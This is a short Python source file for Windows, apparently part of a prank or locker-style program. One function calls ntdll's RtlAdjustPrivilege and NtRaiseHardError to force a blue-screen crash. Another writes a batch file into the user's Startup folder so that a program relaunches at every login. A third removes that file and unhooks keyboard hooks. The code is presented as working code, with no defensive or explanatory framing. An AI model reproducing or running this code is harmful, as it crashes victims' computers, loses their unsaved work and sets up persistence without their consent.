#! /usr/bin python
# -*- coding: utf-8 -*-
import getpass
import os
import keyboard
import ctypes
import subprocess
import ctypes.wintypes

def bsod():
	from ctypes import windll
	from ctypes import c_int
	from ctypes import c_uint
	from ctypes import c_ulong
	from ctypes import POINTER
	from ctypes import byref

	nullptr = POINTER(c_int)()

	windll.ntdll.RtlAdjustPrivilege(
    		c_uint(19), 
    		c_uint(1), 
    		c_uint(0), 
    		byref(c_int())
	)

	windll.ntdll.NtRaiseHardError(
    		c_ulong(0xC000007B), 
    		c_ulong(0), 
    		nullptr, 
    		nullptr, 
    		c_uint(6), 
    		byref(c_uint())
	)


def startup(path):
	USER_NAME = getpass.getuser()
	global bat_path
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	
	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
		bat_file.write(r'start "" %s' % path)

def uninstall(wind):
	wind.destroy()
	os.remove(bat_path + '\\' + "open.bat")
	keyboard.unhook_all()







